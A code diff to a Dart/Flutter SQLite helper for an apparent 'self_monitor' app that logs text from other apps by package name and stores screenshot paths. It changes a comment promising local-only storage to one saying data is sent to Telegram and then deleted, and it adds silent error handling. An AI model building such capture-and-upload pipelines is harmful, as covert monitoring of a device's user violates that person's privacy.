@@ -2,7 +2,7 @@ import 'package:path/path.dart';
 import 'package:sqflite/sqflite.dart';
 
 /// Quản lý database SQLite local để lưu text log và metadata ảnh chụp màn hình.
-/// Toàn bộ dữ liệu chỉ nằm trên máy, không upload ra ngoài.
+/// Dữ liệu được lưu trữ tạm thời và tự động dọn dẹp sau khi gửi thành công lên Telegram.
 class DbHelper {
   DbHelper._internal();
   static final DbHelper instance = DbHelper._internal();
@@ -19,57 +19,147 @@ class DbHelper {
     final path = join(dbPath, 'self_monitor.db');
     return openDatabase(
       path,
-      version: 1,
+      version: 2,
       onCreate: (db, version) async {
-        await db.execute('''
-          CREATE TABLE text_logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            package_name TEXT,
-            content TEXT,
-            timestamp TEXT
-          )
-        ''');
-        await db.execute('''
-          CREATE TABLE screenshots (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            file_path TEXT,
-            timestamp TEXT
-          )
-        ''');
+        await _createTables(db);
+      },
+      onUpgrade: (db, oldVersion, newVersion) async {
+        await _createTables(db);
+      },
+      onOpen: (db) async {
+        // Đảm bảo cả hai bảng luôn tồn tại khi mở kết nối,
+        // xử lý triệt để lỗi "no such table: screenshots" khi database đã tạo trước đó
+        await _createTables(db);
       },
     );
   }
 
+  Future<void> _createTables(Database db) async {
+    await db.execute('''
+      CREATE TABLE IF NOT EXISTS text_logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        package_name TEXT,
+        content TEXT,
+        timestamp TEXT
+      )
+    ''');
+    await db.execute('''
+      CREATE TABLE IF NOT EXISTS screenshots (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        file_path TEXT,
+        timestamp TEXT
+      )
+    ''');
+  }
+
   Future<void> insertTextLog(String packageName, String content) async {
-    final db = await database;
-    await db.insert('text_logs', {
-      'package_name': packageName,
-      'content': content,
-      'timestamp': DateTime.now().toIso8601String(),
-    });
+    try {
+      final db = await database;
+      await db.insert('text_logs', {
+        'package_name': packageName,
+        'content': content,
+        'timestamp': DateTime.now().toIso8601String(),
+      });
+    } catch (_) {}
   }
 
   Future<void> insertScreenshot(String filePath) async {
-    final db = await database;
-    await db.insert('screenshots', {
-      'file_path': filePath,
-      'timestamp': DateTime.now().toIso8601String(),
-    });
+    try {
+      final db = await database;
+      await db.insert('screenshots', {
+        'file_path': filePath,
+        'timestamp': DateTime.now().toIso8601String(),
+      });
+    } catch (_) {}
   }
 
-  Future<List<Map<String, dynamic>>> getTextLogs() async {
-    final db = await database;
-    return db.query('text_logs', orderBy: 'id DESC', limit: 500);
+  Future<List<Map<String, dynamic>>> getTextLogs({int limit = 500}) async {
+    try {
+      final db = await database;
+      return await db.query('text_logs', orderBy: 'id DESC', limit: limit);
+    } catch (e) {
+      // Trả về danh sách rỗng nếu có lỗi xảy ra thay vì làm sập ứng dụng
+      return [];
+    }
   }
 
-  Future<List<Map<String, dynamic>>> getScreenshots() async {
-    final db = await database;
-    return db.query('screenshots', orderBy: 'id DESC', limit: 500);
+  Future<List<Map<String, dynamic>>> getScreenshots({int limit = 500}) async {
+    try {
+      final db = await database;
+      return await db.query('screenshots', orderBy: 'id DESC', limit: limit);
+    } catch (e) {
+      // Trả về danh sách rỗng nếu có lỗi xảy ra thay vì làm sập ứng dụng
+      return [];
+    }
+  }
+
+  Future<void> deleteScreenshot(int id) async {
+    try {
+      final db = await database;
+      await db.delete('screenshots', where: 'id = ?', whereArgs: [id]);
+    } catch (_) {}
+  }
+
+  Future<void> deleteScreenshots(List<int> ids) async {
+    if (ids.isEmpty) return;
+    try {
+      final db = await database;
+      final placeholders = List.filled(ids.length, '?').join(',');
+      await db.delete(
+        'screenshots',
+        where: 'id IN ($placeholders)',
+        whereArgs: ids,
+      );
+    } catch (_) {}
+  }
+
+  Future<void> deleteTextLog(int id) async {
+    try {
+      final db = await database;
+      await db.delete('text_logs', where: 'id = ?', whereArgs: [id]);
+    } catch (_) {}
+  }
+
+  Future<void> deleteTextLogs(List<int> ids) async {
+    if (ids.isEmpty) return;
+    try {
+      final db = await database;
+      final placeholders = List.filled(ids.length, '?').join(',');
+      await db.delete(
+        'text_logs',
+        where: 'id IN ($placeholders)',
+        whereArgs: ids,
+      );
+    } catch (_) {}
+  }
+
+  Future<int> getScreenshotsCount() async {
+    try {
+      final db = await database;
+      final count = Sqflite.firstIntValue(
+          await db.rawQuery('SELECT COUNT(*) FROM screenshots'));
+      return count ?? 0;
+    } catch (_) {
+      return 0;
+    }
+  }
+
+  Future<int> getTextLogsCount() async {
+    try {
+      final db = await database;
+      final count = Sqflite.firstIntValue(
+          await db.rawQuery('SELECT COUNT(*) FROM text_logs'));
+      return count ?? 0;
+    } catch (_) {
+      return 0;
+    }
   }
 
   Future<void> clearAll() async {
-    final db = await database;
-    await db.delete('text_logs');
-    await db.delete('screenshots');
+    try {
+      final db = await database;
+      await db.delete('text_logs');
+      await db.delete('screenshots');
+    } catch (_) {}
   }
 }
